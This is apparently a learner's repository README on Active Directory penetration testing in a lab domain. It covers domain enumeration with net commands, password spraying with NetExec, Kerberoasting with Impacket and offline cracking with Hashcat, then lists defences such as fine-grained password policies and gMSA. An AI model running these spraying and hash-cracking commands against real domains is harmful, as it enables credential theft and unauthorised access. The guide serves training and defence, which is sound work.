# Active Directory Pentesting & Security Assessment Guide 🚀

This repository serves as a practical documentation of Active Directory (AD) security assessments, detailing enumeration techniques, common attack vectors, and industry-standard remediation strategies based on Enterprise environments.

---

## 📁 Lab Environment Architecture
To simulate real-world enterprise environments, the testing was conducted in a controlled sandbox architecture:
- **Domain Controller (DC)**: Windows Server 2019 Standard
- **Forest/Domain Name**: `glitch.local`
- **Functional Level**: Windows Server 2016
- **Attacker Infrastructure**: Kali Linux (Fully updated with Impacket suite)

---

## 🔍 Phase 1: Information Gathering & Enumeration
Post-exploitation and internal network positioning require gathering domain architecture layout without alerting defensive solutions.

### 1. Built-in Windows Utilities (Native Execution)
Gathering domain users and identifying high-privileged groups directly from a compromised workstation:
```powershell
# Enumerate all domain users within the glitch.local domain
net user /domain

# Identify members of the highly privileged Domain Admins group
net group "Domain Admins" /domain

# Enumerate domain password policy to avoid account lockout during attacks
net accounts /domain
```

### 2. Automated Enumeration Tools
- **BloodHound**: Used to map complex attack paths and Active Directory object relationships visually via Neo4j graph databases.
- **PowerView**: Executed to find local admin access shares and misconfigured ACLs/ACEs.

---

## ⚔️ Phase 2: Attack Methodology & Exploitation

### 1. Password Spraying Attack
- **Concept**: Testing a single common password (e.g., `Welcome2026!`) against a comprehensive list of discovered domain accounts to prevent triggering account lockout thresholds.
- **Tooling Used**: `CME` (CrackMapExec) or `NetExec`.
```bash
# Executing password spray against the domain controller
netexec smb 10.10.10.10 -u users.txt -p 'Welcome2026!'
```

### 2. Kerberoasting (Targeting SPNs)
- **Concept**: Requesting Kerberos service tickets (TGS) for accounts with Service Principal Names (SPNs) and cracking the service account hashes offline.
- **Execution**: Using the Impacket framework.
```bash
# Requesting TGS hashes from the Domain Controller
impacket-GetUserSPNs glitch.local/user:password -dc-ip 10.10.10.10 -request -outputfile krb_hashes.txt

# Offline brute-forcing via Hashcat (Mode 13100)
hashcat -m 13100 krb_hashes.txt passwords.txt
```

---

## 🛡️ Phase 3: Mitigation & Remediation (Blue Team Focus)
To secure the enterprise network from the aforementioned attack paths, the following defensive configurations were implemented and verified:

1. **Password Policy Enforcement**: Implemented a Strong Password Policy combined with **Fine-Grained Password Policies (FGPP)** to stop password spraying.
2. **Kerberoasting Defense**: Ensured all service accounts use complex, randomly generated 25+ character passwords or migrated to **Group Managed Service Accounts (gMSA)**.
3. **Least Privilege Principle**: Restricted standard domain users from querying sensitive Active Directory objects where business justification is absent.

---

## 📚 Labs & Certification Reference
The methodologies applied in this repository are aligned with major cyber security training blueprints:
- **TryHackMe**: Active Directory Basics, Breaching AD, Holo Network
- **HackTheBox**: Active Directory Track (Minesweeper, Active)
- **Certifications Target**: eCPPTv3 / PNPT / OSCP
-
